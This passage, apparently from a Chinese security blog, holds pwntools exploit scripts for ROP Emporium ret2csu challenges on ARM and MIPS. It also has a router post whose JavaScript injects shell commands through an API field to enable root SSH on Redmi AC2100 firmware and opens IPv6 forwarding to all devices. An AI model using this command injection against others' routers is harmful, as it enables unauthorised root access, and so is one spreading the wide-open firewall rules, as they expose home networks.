R3</strong>指令将会跳转到<em>R3</em>处，因此R3寄存器应当指向<code>libc_csu_fini</code>，即<code>00010650</code>，为了<strong>CMP</strong>指令后的<strong>BNE</strong>指令不发生跳转，<em>R6</em>和<em>R4</em> 寄存器值应当一致，接下来再次运行<strong>LDMFD SP!, {R4-R10,PC}</strong> 指令，此时只需要将需要复制给PC寄存器的栈上数据值写为ret2win的地址即可，</p>\r\n<p>由于需要控制R3寄存器的值，寻找相关gadget：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary ret2csu_armv5 --only <span class=\"string\">&quot;pop&quot;</span> | grep r3</span><br><span class=\"line\">0x00010474 : pop &#123;r3, pc&#125;</span><br></pre></td></tr></table></figure>\r\n<p>因此栈布局如下：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">-+------------+-</span><br><span class=\"line\"> +  padding   +</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> + 0x00010474 + pop_r3_pc</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> + 0x00010650 + R3</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> + 0x00010644 +\tpop_r4__r10_pc</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> +     0      +</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> +   BBBB     +</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> +     0      +</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> +    arg1    +</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> +    arg2    +</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> +    arg3    +</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> +   BBBBB    +</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> +  00010624  + mov_arg</span><br><span class=\"line\"> +------------+ -</span><br><span class=\"line\"> +            +  </span><br><span class=\"line\"> +            + 0x4 * 7</span><br><span class=\"line\"> +            +</span><br><span class=\"line\"> +------------+</span><br><span class=\"line\"> +  ret2win   +</span><br><span class=\"line\"> +------------+</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"编写exp-4\">编写exp</h4>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;arm&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">ret2win = <span class=\"number\">0x0010498</span></span><br><span class=\"line\">arg1, arg2, arg3 = <span class=\"number\">0xDEADBEEF</span>, <span class=\"number\">0xCAFEBABE</span>, <span class=\"number\">0xD00DF00D</span></span><br><span class=\"line\">pop_r4__r10_pc = <span class=\"number\">0x00010644</span></span><br><span class=\"line\">pop_r3_pc = <span class=\"number\">0x00010474</span></span><br><span class=\"line\">mov_arg = <span class=\"number\">0x0001062C</span></span><br><span class=\"line\">csu_fini = <span class=\"number\">0x00010650</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-arm&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class=\"string\">&#x27;./ret2csu_armv5&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(pop_r3_pc)</span><br><span class=\"line\">payload += p32(csu_fini)</span><br><span class=\"line\">payload += p32(pop_r4__r10_pc)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(arrray_end)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(arg1)</span><br><span class=\"line\">payload += p32(arg2)</span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;AAAA&quot;</span></span><br><span class=\"line\">payload += p32(mov_arg)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBB&quot;</span> * <span class=\"number\">7</span> </span><br><span class=\"line\">payload += p32(ret2win)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"运行结果-4\">运行结果</h4>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span>: pid 4638</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">ret2csu by ROP Emporium</span><br><span class=\"line\">ARMv5</span><br><span class=\"line\"></span><br><span class=\"line\">Check out https://ropemporium.com/challenge/ret2csu.html <span class=\"keyword\">for</span> information on how to solve this challenge.</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"armv5-hf\">armv5-hf</h4>\r\n<p>这里只给出exp，不做详细解释，值的注意的是lib_csu_init的代码为thumb模式代码，需要进行指令模式切换。</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = &#x27;arm&#x27;</span><br><span class=\"line\">context.endian = &#x27;little&#x27;</span><br><span class=\"line\">context.bits = 32</span><br><span class=\"line\"></span><br><span class=\"line\">ret2win = 0x000104A4</span><br><span class=\"line\">arg1, arg2, arg3 = 0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D</span><br><span class=\"line\">pop_r3__r9_pc = 0x00010622</span><br><span class=\"line\">mov_arg = 0x00010616</span><br><span class=\"line\">array_end = 0x00010630</span><br><span class=\"line\"></span><br><span class=\"line\">p = process([&#x27;qemu-arm&#x27;, &#x27;-L&#x27;, &#x27;/usr/arm-linux-gnueabihf/&#x27;, &#x27;./ret2csu_armv5-hf&#x27;])</span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&quot;A&quot; * (0x24)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(pop_r3__r9_pc + 1)</span><br><span class=\"line\">payload += p32(array_end+1) # r3</span><br><span class=\"line\">payload += p32(0)           # r4</span><br><span class=\"line\">payload += p32(0)           # r5</span><br><span class=\"line\">payload += p32(0)           # r6</span><br><span class=\"line\">payload += p32(arg1)</span><br><span class=\"line\">payload += p32(arg2)</span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\">payload += p32(mov_arg+1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += b&quot;BBBB&quot; * 7</span><br><span class=\"line\">payload += p32(ret2win)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"mipsel-2\">mipsel</h3>\r\n<h4 id=\"分析-5\">分析</h4>\r\n<p>利用原理和上题类似，都是利用<code>libc_csu_init</code>中存在的gadget将所需参数写入参数寄存器 <em>a0, a1, a2</em> 中，因此直接查看<code>libc_csu_init</code>中的gadget：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:004009A0                               loc_4009A0:                              # CODE XREF: __libc_csu_init+78↓j</span><br><span class=\"line\">.text:004009A0 00 00 19 8E                   lw      $t9, 0($s0)</span><br><span class=\"line\">.text:004009A4 01 00 31 26                   addiu   $s1, 1</span><br><span class=\"line\">.text:004009A8 25 30 A0 02                   move    $a2, $s5</span><br><span class=\"line\">.text:004009AC 25 28 80 02                   move    $a1, $s4</span><br><span class=\"line\">.text:004009B0 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.text:004009B4 25 20 60 02                   move    $a0, $s3</span><br><span class=\"line\">.text:004009B4</span><br><span class=\"line\">.text:004009B8 F9 FF 51 16                   bne     $s2, $s1, loc_4009A0</span><br><span class=\"line\">.text:004009BC 04 00 10 26                   addiu   $s0, 4</span><br><span class=\"line\">.text:004009BC</span><br><span class=\"line\">.text:004009C0</span><br><span class=\"line\">.text:004009C0                               loc_4009C0:                              # CODE XREF: __libc_csu_init+58↑j</span><br><span class=\"line\">.text:004009C0 34 00 BF 8F                   lw      $ra, 0x1C+var_s18($sp)</span><br><span class=\"line\">.text:004009C4 30 00 B5 8F                   lw      $s5, 0x1C+var_s14($sp)</span><br><span class=\"line\">.text:004009C8 2C 00 B4 8F                   lw      $s4, 0x1C+var_s10($sp)</span><br><span class=\"line\">.text:004009CC 28 00 B3 8F                   lw      $s3, 0x1C+var_sC($sp)</span><br><span class=\"line\">.text:004009D0 24 00 B2 8F                   lw      $s2, 0x1C+var_s8($sp)</span><br><span class=\"line\">.text:004009D4 20 00 B1 8F                   lw      $s1, 0x1C+var_s4($sp)</span><br><span class=\"line\">.text:004009D8 1C 00 B0 8F                   lw      $s0, 0x1C+var_s0($sp)</span><br><span class=\"line\">.text:004009DC 08 00 E0 03                   jr      $ra</span><br><span class=\"line\">.text:004009E0 38 00 BD 27                   addiu   $sp, 0x38</span><br></pre></td></tr></table></figure>\r\n<p>可以利用pop链首先将pwnme的返回地址覆盖为<code>004009C0</code>，运行<span class=\"math inline\">\\(gadget_1\\)</span>(范围为0x04009C0-004009E4)，将栈上的数据分别复制到 <em>ra, s5, s4, s3, s2, s1, s0</em> 寄存器中，其中 <em>ra</em> 寄存器值复制为<code>004009A0</code>，使<span class=\"math inline\">\\(gadget_1\\)</span>运行完后跳转到<span class=\"math inline\">\\(gadget_2\\)</span>(范围为0x04009A0-004009C0)，由于 <em>s5, s4, s3</em> 将会分别复制给 <em>a2, a1, a0</em> 寄存器，因此其值分别复制为三个参数的值，对于 <em>s2, s1, s0</em> 的赋值，需要结合<span class=\"math inline\">\\(gadget_2\\)</span>来看，<em>s1</em>应当比 <em>s2</em> 的值小1，因为 <span class=\"math inline\">\\(gadget_2\\)</span> 中将s1值自增1，<span class=\"math inline\">\\(gadget_2\\)</span> 中会跳转到 <em>t9</em> 寄存器所指向的地址，而 <em>t9</em> 寄存器值由 <em>s0</em> 控制写入，为避免跳转到 <em>t9</em> 处对 <em>a2, a1, a0</em> 产生影响，因此 <em>t9</em> 寄存器所指向的地址的代码应当简单，查看可利用的gadget：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:004009E4 08 00 E0 03                   jr      $ra</span><br><span class=\"line\">.text:004009E8 00 00 00 00                   nop</span><br></pre></td></tr></table></figure>\r\n<p>发现<code>004009E4</code>处指令较为简单，直接返回了调用函数，且<code>00411030</code>处值为<code>004009E4</code>，可以将 <em>s0</em> 复制为<code>00411030</code>，则 <em>t9</em> 值将会加载为<code>004009E4</code>，当运行<code>jalr $t9</code>指令后，不会对 <span class=\"math inline\">\\(gadget_2\\)</span> 产生影响。</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.got:00411030 E4 09 40 00                   __libc_csu_fini_ptr:.word __libc_csu_fini</span><br></pre></td></tr></table></figure>\r\n<p>当 <span class=\"math inline\">\\(gadget_2\\)</span> 运行完毕后，会继续执行 <span class=\"math inline\">\\(gadget_1\\)</span> 处的代码，此时只需要将 <em>ra</em> 寄存器值复制为<code>ret2win</code>地址即可。</p>\r\n<h4 id=\"编写exp-5\">编写exp</h4>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ast <span class=\"keyword\">import</span> arg</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;mips&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-mipsel&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class=\"string\">&#x27;./ret2csu_mipsel&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">ret2win = <span class=\"number\">0x00400A60</span></span><br><span class=\"line\">nop = <span class=\"number\">0x00411030</span></span><br><span class=\"line\">lw_ra_jr = <span class=\"number\">0x004009C0</span></span><br><span class=\"line\">mov_arg = <span class=\"number\">0x004009A0</span></span><br><span class=\"line\"></span><br><span class=\"line\">arg1 = <span class=\"number\">0xDEADBEEF</span></span><br><span class=\"line\">arg2 = <span class=\"number\">0x0CAFEBABE</span></span><br><span class=\"line\">arg3 = <span class=\"number\">0x0D00DF00D</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(lw_ra_jr)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;B&quot;</span> * <span class=\"number\">0x1C</span></span><br><span class=\"line\">payload += p32(nop)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload += p32(arg1)</span><br><span class=\"line\">payload += p32(arg2)</span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\">payload += p32(mov_arg)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;C&quot;</span> * <span class=\"number\">0x1C</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;CCCC&quot;</span> * <span class=\"number\">6</span></span><br><span class=\"line\">payload += p32(ret2win)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"运行结果-5\">运行结果</h4>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-mipsel&#x27;</span>: pid 4066</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">ret2csu by ROP Emporium</span><br><span class=\"line\">MIPS</span><br><span class=\"line\"></span><br><span class=\"line\">Check out https://ropemporium.com/challenge/ret2csu.html <span class=\"keyword\">for</span> information on how to solve this challenge.</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"参考\">参考</h2>\r\n<ol type=\"1\">\r\n<li>[<a href=\"https://bbs.pediy.com/thread-272054.htm\">原创]writeup-ROP Emporium fluff-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></li>\r\n<li><a href=\"https://blog.csdn.net/AcSuccess/article/details/104448463\">中级ROP之ret2csu_西杭的博客-CSDN博客</a></li>\r\n</ol>\r\n","tags":["pwn","rop"]},{"title":"Redmi AC2100 路由器 官方固件允许IPv6外网访问下游设备","url":"/2023/04/29/Redmi-AC2100-%E8%B7%AF%E7%94%B1%E5%99%A8-%E5%AE%98%E6%96%B9%E5%9B%BA%E4%BB%B6%E5%85%81%E8%AE%B8IPv6%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE%E4%B8%8B%E6%B8%B8%E8%AE%BE%E5%A4%87/","content":"<ol type=\"1\">\r\n<li><p>开启SSH权限</p>\r\n<p>浏览器登录路由器管理页面后，打开开发者模式，输入以下代码至控制台处，回车执行：</p>\r\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">getSTOK</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> match = location.<span class=\"property\">href</span>.<span class=\"title function_\">match</span>(<span class=\"regexp\">/;stok=(.*?)\\//</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!match) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> match[<span class=\"number\">1</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">execute</span>(<span class=\"params\">stok, command</span>) &#123;</span><br><span class=\"line\">    command = <span class=\"built_in\">encodeURIComponent</span>(command);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> path = <span class=\"string\">`/cgi-bin/luci/;stok=<span class=\"subst\">$&#123;stok&#125;</span>/api/misystem/set_config_iotdev?bssid=SteelyWing&amp;user_id=SteelyWing&amp;ssid=-h%0A<span class=\"subst\">$&#123;command&#125;</span>%0A`</span>;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(path);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">fetch</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Request</span>(location.<span class=\"property\">origin</span> + path));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">enableSSH</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    stok = <span class=\"title function_\">getSTOK</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!stok) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(<span class=\"string\">&#x27;stok not found in URL&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`stok = &quot;<span class=\"subst\">$&#123;stok&#125;</span>&quot;`</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    password = <span class=\"title function_\">prompt</span>(<span class=\"string\">&#x27;Input new SSH password&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!password) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(<span class=\"string\">&#x27;You must input password&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"title function_\">execute</span>(stok, </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">nvram set ssh_en=1</span></span><br><span class=\"line\"><span class=\"string\">nvram commit</span></span><br><span class=\"line\"><span class=\"string\">sed -i &#x27;s/channel=.*/channel=\\\\&quot;debug\\\\&quot;/g&#x27; /etc/init.d/dropbear</span></span><br><span class=\"line\"><span class=\"string\">/etc/init.d/dropbear start</span></span><br><span class=\"line\"><span class=\"string\">`</span></span><br><span class=\"line\">    )</span><br><span class=\"line\">        .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> response.<span class=\"title function_\">text</span>())</span><br><span class=\"line\">        .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">text</span>) =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(text));</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;New SSH password: &#x27;</span> + password);</span><br><span class=\"line\">    <span class=\"title function_\">execute</span>(stok, <span class=\"string\">`echo -e &quot;<span class=\"subst\">$&#123;password&#125;</span>\\\\n<span class=\"subst\">$&#123;password&#125;</span>&quot; | passwd root`</span>)</span><br><span class=\"line\">        .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> response.<span class=\"title function_\">text</span>())</span><br><span class=\"line\">        .<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">text</span>) =&gt;</span> <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(text));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">enableSSH</span>();</span><br></pre></td></tr></table></figure>\r\n<p>此时弹出一个对话框，要求输入密码，此时可以设定root用户登录密码，输入一个你想设置的密码并提交。此后，便可以通过该密码SSH登录路由器。</p></li>\r\n<li><p>开放端口</p>\r\n<ol type=\"1\">\r\n<li><p>开放全部端口</p>\r\n<p>使用 Vim 修改防火墙配置文件：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim /etc/config/firewall</span><br></pre></td></tr></table></figure>\r\n<p>将<code>defaults</code>配置中的<code>disable_ipv6</code>值改为<code>0</code>，<code>zone</code>配置下<code>forward</code>值改为<code>ACCEPT</code>。</p>\r\n<p>并新建一条规则</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">config rule                   </span><br><span class=\"line\">  option name &#x27;Allow-IPv6&#x27;</span><br><span class=\"line\">  option target &#x27;ACCEPT&#x27;  </span><br><span class=\"line\">  option family &#x27;ipv6&#x27;    </span><br><span class=\"line\">  list proto &#x27;all&#x27;        </span><br><span class=\"line\">  option src &#x27;*&#x27;          </span><br><span class=\"line\">  option dest &#x27;*&#x27; </span><br></pre></td></tr></table></figure>\r\n<p>修改完毕后，保存文件并退出，执行重启防火墙命令。</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">/etc/init.d/firewall restart</span><br></pre></td></tr></table></figure></li>\r\n<li><p>开放部分端口</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ <span class=\"comment\">#vi /etc/rc.local</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Put your custom commands here that should be executed once</span></span><br><span class=\"line\"><span class=\"comment\"># the system init finished. By default this file does nothing.</span></span><br><span class=\"line\"></span><br><span class=\"line\">ip6tables -I forwarding_rule -p tcp --dport 1234 -j ACCEPT</span><br><span class=\"line\">ip6tables -I forwarding_rule -p tcp --dport 5678 -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exit</span> 0</span><br></pre></td></tr></table></figure>\r\n<p>或者使用<code>crontab -e</code>开启</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">*/5 * * * * ip6tables -L | grep <span class=\"string\">&quot;tcp dpt:ssh&quot;</span>; [ $? != 0 ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;add port&quot;</span> &amp;&amp; ip6tables -I forwarding_rule -p tcp --dport 22 -j ACCEPT</span><br><span class=\"line\">*/5 * * * * ip6tables -L | grep <span class=\"string\">&quot;tcp dpt:1234&quot;</span>; [ $? != 0 ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;add port&quot;</span> &amp;&amp; ip6tables -I forwarding_rule -p tcp --dport 1234 -j ACCEPT</span><br><span class=\"line\">*/5 * * * * ip6tables -L | grep <span class=\"string\">&quot;tcp dpt:5678&quot;</span>; [ $? != 0 ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;add port&quot;</span> &amp;&amp; ip6tables -I forwarding_rule -p tcp --dport 5678 -j ACCEPT</span><br></pre></td></tr></table></figure></li>\r\n</ol></li>\r\n</ol>\r\n","categories":["Life"],"tags":["搞机"]},{"title":"初识APK文件结构、双开、汉化及基础修改","url":"/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/","content":"<h2 id=\"apk结构\">APK结构</h2>\r\n<p>APK全称为<code>Android Package</code>，实质为压缩文件，将后缀改为<strong>zip</strong>可以采用压缩工具将其解压。解压后，其主要包含的文件目录如下：</p>\r\n<figure>\r\n<img src=\"/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20231212001151547.png\" alt=\"APK结构\">\r\n<figcaption aria-hidden=\"true\">APK结构</figcaption>\r\n</figure>\r\n<p>其具体解释如下</p>\r\n<table>\r\n<colgroup>\r\n<col style=\"width: 24%\">\r\n<col style=\"width: 75%\">\r\n</colgroup>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>文件</th>\r\n<th>注释</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>assets目录</td>\r\n<td>存放apk的静态资源文件，如图片、视频、音频等</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>lib目录</td>\r\n<td>armeabi-v7a用于大部分Android设备，arm64-v8a仅适用于64位Android设备，x86常用于Android模拟器，x86-64用于64位Android模拟器，其目录下的.so文件是c或c++语言编译形成的动态链接库文件</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>META-INF目录</td>\r\n<td>保存应用的签名信息，可用于验证APK文件的完整性</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>res目录</td>\r\n<td>存放资源文件，包括图片，字符串等，其layout文件用于设计apk界面</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>AndroidManifest.xml</td>\r\n<td>APK应用清单，每个应用根目录必须包含此文件，包括APP配置信息，如包名，版本，组件，权限，链接库</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>classes.dex</td>\r\n<td>应用运行的主要代码逻辑</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>resources.arsc</td>\r\n<td>二进制资源文件，通过ID索引文件资源</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<h2 id=\"应用双开及原理\">应用双开及原理</h2>\r\n<table>\r\n<colgroup>\r\n<col style=\"width: 18%\">\r\n<col style=\"width: 81%\">\r\n</colgroup>\r\n<thead>\r\n<tr class=\"header\">\r\n<th>原理</th>\r\n<th>解释</th>\r\n</tr>\r\n</thead>\r\n<tbody>\r\n<tr class=\"odd\">\r\n<td>修改包名</td>\r\n<td>系统认为是2个APP，实质为两个互不干扰的APP</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>魔改Framework</td>\r\n<td>例如小米自带多开</td>\r\n</tr>\r\n<tr class=\"odd\">\r\n<td>虚拟化机制</td>\r\n<td>虚拟化Framework层，虚拟化文件系统，模拟Android对组件的管理，例如平行空间</td>\r\n</tr>\r\n<tr class=\"even\">\r\n<td>以插件机制运行</td>\r\n<td>利用反射替换，动态代理（过滤），hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<figure>\r\n<img src=\"/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20231213152217987.png\" alt=\"APK共存步骤一\">\r\n<figcaption aria-hidden=\"true\">APK共存步骤一</figcaption>\r\n</figure>\r\n<p>点击APK共存，对包名进行修改，最后进行安装即可</p>\r\n<figure>\r\n<img src=\"/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20231213152336390.png\" alt=\"APK共存步骤二\">\r\n<figcaption aria-hidden=\"true\">APK共存步骤二</figcaption>\r\n</figure>\r\n<blockquote>\r\n<p>值得注意的是，此方法双开对包名信息进行了修改，若开发者在APP中对签名信息进行了校验，则不能简单修改包名进行双开。</p>\r\n</blockquote>\r\n<h2 id=\"汉化apk\">汉化APK</h2>\r\n<p>使用专门的工具对外文软件内的资源进行读取、翻译、修改并回等一系列操作，使得软件界面呈现中文状态，但保留原程序代码和功能逻辑，其流程如下：</p>\r\n<figure>\r\n<img src=\"/2023/12/11/%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E5%8F%8A%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/105739b6qnot0ms5l1kime.png\" alt=\"逆向流程\">\r\n<figcaption 